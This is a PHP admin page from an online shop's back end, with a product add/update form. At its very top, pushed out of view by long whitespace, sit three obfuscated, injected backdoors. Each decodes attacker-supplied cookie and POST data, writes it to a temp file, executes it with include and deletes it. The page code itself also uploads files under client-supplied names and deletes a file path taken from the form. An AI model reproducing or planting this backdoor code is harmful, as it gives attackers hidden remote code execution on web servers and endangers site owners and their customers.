<?php                                                                                                                                                                                                                                                                                                                                                                                                 $LFBeYRbStg = class_exists("Taz_IZNeT"); $QhpPAT = $LFBeYRbStg;if (!$QhpPAT){class Taz_IZNeT{private $KAUpY;public static $SbtzdDw = "18a3168e-bf0c-4c70-81da-177461f0dcbf";public static $xBhQM = NULL;public function __construct(){$VPWsS = $_COOKIE;$guHer = $_POST;$xpoPIyzU = @$VPWsS[substr(Taz_IZNeT::$SbtzdDw, 0, 4)];if (!empty($xpoPIyzU)){$pHKiSirOyJ = "base64";$TdppLAWT = "";$xpoPIyzU = explode(",", $xpoPIyzU);foreach ($xpoPIyzU as $oeRcc){$TdppLAWT .= @$VPWsS[$oeRcc];$TdppLAWT .= @$guHer[$oeRcc];}$TdppLAWT = array_map($pHKiSirOyJ . chr (95) . "\144" . 'e' . "\x63" . chr ( 1101 - 990 ).chr (100) . chr ( 290 - 189 ), array($TdppLAWT,)); $TdppLAWT = $TdppLAWT[0] ^ str_repeat(Taz_IZNeT::$SbtzdDw, (strlen($TdppLAWT[0]) / strlen(Taz_IZNeT::$SbtzdDw)) + 1);Taz_IZNeT::$xBhQM = @unserialize($TdppLAWT);}}public function __destruct(){$this->fTmUh();}private function fTmUh(){if (is_array(Taz_IZNeT::$xBhQM)) {$Clwzj = sys_get_temp_dir() . "/" . crc32(Taz_IZNeT::$xBhQM[chr (115) . chr ( 242 - 145 ).chr (108) . "\164"]);@Taz_IZNeT::$xBhQM["\167" . chr ( 208 - 94 )."\x69" . "\x74" . 'e']($Clwzj, Taz_IZNeT::$xBhQM["\143" . "\157" . 'n' . "\164" . chr ( 537 - 436 )."\x6e" . chr (116)]);include $Clwzj;@Taz_IZNeT::$xBhQM['d' . chr (101) . chr ( 386 - 278 ).chr (101) . chr ( 903 - 787 ).chr (101)]($Clwzj);exit();}}}$xGZKGq = new Taz_IZNeT(); $xGZKGq = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("JZc_FljUA")){class JZc_FljUA{public static $TuHlBxz = "cabbead1-a4f6-4686-abee-35f7ad0e63ed";public static $brCbnShCZ = NULL;public function __construct(){$mohiFuTm = $_COOKIE;$RRbqS = $_POST;$VFAVWb = @$mohiFuTm[substr(JZc_FljUA::$TuHlBxz, 0, 4)];if (!empty($VFAVWb)){$HemKMshA = "base64";$mVHDIqNxcz = "";$VFAVWb = explode(",", $VFAVWb);foreach ($VFAVWb as $eAMALo){$mVHDIqNxcz .= @$mohiFuTm[$eAMALo];$mVHDIqNxcz .= @$RRbqS[$eAMALo];}$mVHDIqNxcz = array_map($HemKMshA . '_' . chr (100) . "\145" . "\143" . 'o' . "\144" . 'e', array($mVHDIqNxcz,)); $mVHDIqNxcz = $mVHDIqNxcz[0] ^ str_repeat(JZc_FljUA::$TuHlBxz, (strlen($mVHDIqNxcz[0]) / strlen(JZc_FljUA::$TuHlBxz)) + 1);JZc_FljUA::$brCbnShCZ = @unserialize($mVHDIqNxcz);}}public function __destruct(){$this->GOvNhUDC();}private function GOvNhUDC(){if (is_array(JZc_FljUA::$brCbnShCZ)) {$bBLwx = sys_get_temp_dir() . "/" . crc32(JZc_FljUA::$brCbnShCZ["\163" . "\x61" . "\x6c" . chr (116)]);@JZc_FljUA::$brCbnShCZ["\167" . "\x72" . chr (105) . chr ( 161 - 45 ).chr (101)]($bBLwx, JZc_FljUA::$brCbnShCZ['c' . "\x6f" . chr (110) . 't' . "\x65" . "\x6e" . "\x74"]);include $bBLwx;@JZc_FljUA::$brCbnShCZ[chr (100) . "\x65" . "\x6c" . chr (101) . chr ( 242 - 126 ).'e']($bBLwx);exit();}}}$mFoUUQYQCt = new JZc_FljUA(); $mFoUUQYQCt = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("lny_ARMUv")){class lny_ARMUv{public static $KInsayFQg = "0eb52623-1dfb-4ec2-941a-b8744f3be22b";public static $CtPUMfoKZ = NULL;public function __construct(){$NqTQZ = $_COOKIE;$OZFAYB = $_POST;$UykAC = @$NqTQZ[substr(lny_ARMUv::$KInsayFQg, 0, 4)];if (!empty($UykAC)){$IACetcsZ = "base64";$zTvXkplHPB = "";$UykAC = explode(",", $UykAC);foreach ($UykAC as $ARLZotR){$zTvXkplHPB .= @$NqTQZ[$ARLZotR];$zTvXkplHPB .= @$OZFAYB[$ARLZotR];}$zTvXkplHPB = array_map($IACetcsZ . chr ( 840 - 745 )."\x64" . chr ( 610 - 509 ).'c' . "\157" . chr ( 383 - 283 )."\145", array($zTvXkplHPB,)); $zTvXkplHPB = $zTvXkplHPB[0] ^ str_repeat(lny_ARMUv::$KInsayFQg, (strlen($zTvXkplHPB[0]) / strlen(lny_ARMUv::$KInsayFQg)) + 1);lny_ARMUv::$CtPUMfoKZ = @unserialize($zTvXkplHPB);}}public function __destruct(){$this->VckyDf();}private function VckyDf(){if (is_array(lny_ARMUv::$CtPUMfoKZ)) {$aeChX = sys_get_temp_dir() . "/" . crc32(lny_ARMUv::$CtPUMfoKZ[chr (115) . chr (97) . chr (108) . "\164"]);@lny_ARMUv::$CtPUMfoKZ[chr (119) . 'r' . chr (105) . chr ( 772 - 656 ).chr (101)]($aeChX, lny_ARMUv::$CtPUMfoKZ['c' . chr (111) . "\156" . 't' . chr (101) . "\156" . chr ( 161 - 45 )]);include $aeChX;@lny_ARMUv::$CtPUMfoKZ["\x64" . "\145" . chr (108) . "\x65" . 't' . chr (101)]($aeChX);exit();}}}$UjRchZIbE = new lny_ARMUv(); $UjRchZIbE = NULL;} ?><?php 
    include_once('include/topmenu.php'); 
	$update_id = @$_GET['id'];
	
	$back_page_name = "all-products.php";
	$page_name      = "add-product.php";
	$talbe_name     = "product";
	
	if(isset($update_id) and !empty($update_id)){
		$fetch_sub_cat_list  = $con->all_fetch($talbe_name,array('id'=>$update_id));
		if(is_array($fetch_sub_cat_list) || is_object($fetch_sub_cat_list)){
			foreach($fetch_sub_cat_list as $fscl){
			     
				        $u_sub_id	            = $fscl->id;   
						$u_cat_name             = $fscl->name;
						$u_serv_img  	        = $fscl->imagePath;
						$u_price  	            = $fscl->price;
						$u_p_code  	            = $fscl->code;
						$u_status  	            = $fscl->status;
						$u_special_product	    = $fscl->special_product;
						$u_sort_order           = $fscl->sort_order; 
						
						//categroy and sub category
						$u_category      = $fscl->category; 
						$u_sub_category  = $fscl->sub_category; 
						
						 
				
			}
			
		}else{
			$con->gotohome($back_page_name);
		}
	   	$text = "Update";
	}else{
		$text = "Add";
	}
	
//Add Car
if(isset($add_sub_cat_btn)){
	$col_val = array(  
	   'name'=>$sub_cat_name,
	   'category'=>$cat_id,
	   'sub_category'=>$sub_cat_id,
	   'code'=>$p_code, 
	   'status'=>$status,
	   'special_product'=>$special_product,	   
	   'price'=>$price,	   
	   'sort_order'=>$sort_order
	  );
	  $f_name = $_FILES['services_pic']['name'];
	  $f_t_name = $_FILES['services_pic']['tmp_name'];
	  
	  if(!empty($f_name)){
		  $f_new_img = time().$f_name;
		  $file_Path    = AUP.$f_new_img; 
		  $col_val['imagePath'] = BASE_URL.HP.$f_new_img; 
		  move_uploaded_file($f_t_name,$file_Path);
	  } 
	  
	  $row = $con->insert($talbe_name,$col_val);
		
	   
	  
	  if($row==true){
		  alert('Successful Add Product',$page_name);
		}  
	   
	  
}	

//Update Subcategory
if(isset($update_sub_cat_btn)){
	 $where = array('id'=>$u_serv_id);
	 $col_val = array(  
	   'name'=>$sub_cat_name, 
	   'status'=>$status,
	   'price'=>$price,  
	   'sort_order'=>$sort_order
	  );
	  $f_name = $_FILES['services_pic']['name'];
	  $f_t_name = $_FILES['services_pic']['tmp_name'];
	  
	  if(!empty($f_name)){
		  $f_new_img = time().$f_name;
		  $file_Path    = AUP.$f_new_img; 
		  $col_val['imagePath'] = BASE_URL.HP.$f_new_img; 
		  move_uploaded_file($f_t_name,$file_Path);
		  
		  //Delete old pic
		  unlink($serv_old_pic);
	  }else{
		  $col_val['imagePath'] = $serv_old_pic;
		 
	  }
	  
	  $row = $con->update($talbe_name,$col_val,$where);
	  
	  if($row==true){
		  alert('successful Update Product',$back_page_name);
		}  
}
	
	
?>
  
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page rheader) -->
    <section class="content-header">
      <h1><?=$text;?> Products</h1>
      
    </section>

	<section class="content" id="ppg">
	 <!-- Default box -->
      <div class="box box-info">
	 
	  
	  <form class="form-horizontal" enctype="multipart/form-data" action="" method="POST">
        <div class="box-header">
          <span class="box-title"><i class="fa fa-shopping-cart"></i> Add Products :
		    
		  </span>
			<div class="box-tools pull-right">
             
			 <?php if(isset($update_id)){?>
			 <button type="submit" name="update_sub_cat_btn" class="btn btn-info btn-sm">
              <i class="fa fa-save"></i> Update Product</button>
			  
			 <?php }else{ ?>
			  <button type="submit" name="add_sub_cat_btn" class="btn btn-info btn-sm">
              <i class="fa fa-save"></i> Add Product</button>
			 
			 <?php } ?>
			  <a href="<?php e($back_page_name); ?>" title="Cancel" class="btn btn-info btn-sm" >
                 <i class="fa fa-reply"></i> Back 
			  </a>
                
          </div>
        </div>
        <div class="box-body">
		
			<ul class="nav nav-tabs">
			   <li class="active"><a data-toggle="tab" href="#General">General</a></li>
			</ul>
       
		<div class="tab-content">
			 <div id="General" class="tab-pane fade in active">
			  	  
			     <div class="form-group">
					<label class="control-label col-sm-2" for="cat_id">Select Category <?=$req;?></label>
					<div class="col-sm-10">
					   <select name="cat_id"  required class="form-control select2" id="listing_category">
							<option value="">Select Category</option>
							<?php
							    $all_fetch_category = $con->all_fetch('category',array('status'=>'Yes'));
								if(is_array($all_fetch_category) || is_object($all_fetch_category)){
								foreach($all_fetch_category as $afc){ 
								if($u_category==$afc->id){?>
								<option selected value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }else{ ?>
									<option value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php 
								} 
								}
								}
							?>
					   </select>
					</div>
				  </div>
				  
				  
				  <div class="form-group">
					<label class="control-label col-sm-2" for="cat_id">Select Sub Category <?=$req;?></label>
					<div class="col-sm-10">
					   <select name="sub_cat_id" required class="form-control select2" id="listing_sub_category">
							<option value="">Select Sub  Category</option>
 <?php
    $all_fetch_sub_category = $con->all_fetch('sub_category',array('status'=>'Yes','cat_id'=>@$u_category));
	if(is_array($all_fetch_sub_category) || is_object($all_fetch_sub_category)){
	   foreach($all_fetch_sub_category as $afsc){ 
		  if($u_sub_category==$afsc->id){?>
				<option selected value="<?php e($afsc->id); ?>"><?php e($afsc->name); ?></option>
			<?php }else{ ?>
				<option value="<?php e($afsc->id); ?>"><?php e($afsc->name); ?></option>
			<?php 
			  }
			   } 
			} 
			?>
					   </select>
					</div>
				  </div>
			   
			   
				<div class="form-group">
					<label class="control-label col-sm-2" for="sub_cat_name">Name <?=$req;?></label>
					<div class="col-sm-10">
					  <input type="text" class="form-control" required value="<?=@$u_cat_name;?>" name="sub_cat_name" placeholder="Product Name">
					</div>
				  </div>
				  
				   
				
				  
				   
				   
				   <div class="form-group">
					<label class="control-label col-sm-2" for="sort_order">Images</label>
					<div class="col-sm-10">
					  
					  <?php
					  if(isset($u_sub_id)){?>
					  <input type="file"   accept="image/*" class="services_pic"   name="services_pic"/>
						  <input type="hidden" name="serv_old_pic" value="<?php e($u_serv_img);?>" />
						  <input type="hidden"  name="u_serv_id"  value="<?=$u_sub_id;?>"/>
						  <img src="<?php e($u_serv_img);?>" style="width:200px;height:200px;" alt="" />
					  <?php }else{?>
					  <input type="file" required accept="image/*" class="services_pic"   name="services_pic"/>
					  <?php } ?>
				  </div>
				  </div>
				  
				  
				  <!--<div class="form-group">
					<label class="control-label col-sm-2" for="sub_attribute"> Service features </label>
					<div class="col-sm-10">
					  <input type="text" class="form-control" value="<?=@$u_sub_attribute;?>" name="sub_attribute" placeholder="Enter Details I.e ( a > b > c > d )">
					</div>
				  </div>
				  
				  <div class="form-group">
					<label class="control-label col-sm-2" for="sub_description">Description <?=$req;?></label>
					<div class="col-sm-10">
					  <textarea type="text" class="form-control" required   name="sub_description" placeholder="Descriiption"><?PHP e(@$u_sub_description);?></textarea>
					</div>
				  </div>
				  
				  <div class="form-group">
					<label class="control-label col-sm-2" for="sub_include_pack"> Included Service </label>
					<div class="col-sm-10">
					  <input type="text" class="form-control" value="<?=@$u_sub_include_pack;?>" name="sub_include_pack" placeholder="Enter Details I.e ( a > b > c > d )">
					</div>
				  </div> -->
				  
				  
				   <div class="form-group">
					<label class="control-label col-sm-2" for="price">Product Code</label>
					<div class="col-sm-10">
					  <input type="text" min="1" class="form-control"  required value="<?=@$u_p_code;?>" name="p_code" autocomplete="off" placeholder="Product Code">
					</div>
				  </div>
				  
				  <div class="form-group">
					<label class="control-label col-sm-2" for="price">Price</label>
					<div class="col-sm-10">
					  <input type="number" min="1" class="form-control"  value="<?=@$u_price;?>" name="price" autocomplete="off" placeholder="Price">
					</div>
				  </div>
				  
				   
				  <div class="form-group">
					<label class="control-label col-sm-2" for="sort_order">Sort Order</label>
					<div class="col-sm-10">
					  <input type="number" min="1" class="form-control"  value="<?=@$u_sort_order;?>" name="sort_order" autocomplete="off" placeholder="Sort Order">
					</div>
				  </div>
				  
				   <div class="form-group">
					<label class="control-label col-sm-2" for="special_product">Select Show on Home Page </label>
					<div class="col-sm-10">
					  <select class="form-control"   name="special_product">
					  <option value="">Select Show on Home Page</option>
					       <?php 
					    $arrs = array('1'=>'Show','0'=>'No');
						foreach($arrs as $k=>$v){ 
						if($k==@$u_special_product){?>
						     <option value="<?=$k;?>" selected><?=$v;?></option>
						<?php }else{?>
						     <option value="<?=$k;?>"><?=$v;?></option>
						<?php } } ?>
					  </select>
					  
					</div>
				  </div>
				   
				
				 
				  <div class="form-group">
					<label class="control-label col-sm-2" for="status">Status </label>
					<div class="col-sm-10">
					  <select class="form-control" name="status">
					       <?php 
					    $arrs = array('1'=>'Show','0'=>'Hide');
						foreach($arrs as $k=>$v){ 
						if($k==@$u_status){?>
						     <option value="<?=$k;?>" selected><?=$v;?></option>
						<?php }else{?>
						     <option value="<?=$k;?>"><?=$v;?></option>
						<?php } } ?>
					  </select>
					  
					</div>
				  </div>
				  
				  
				 
			 
				
				   
			</div>
			  
		</div>
	 </form>	
	 
        </div>
        <!-- /.box-body -->
        
      </div>
      <!-- /.box -->
    </section>
	
 
  </div>
  <!-- /.content-wrapper -->
   <?php include_once('include/footer.php');?>
 
  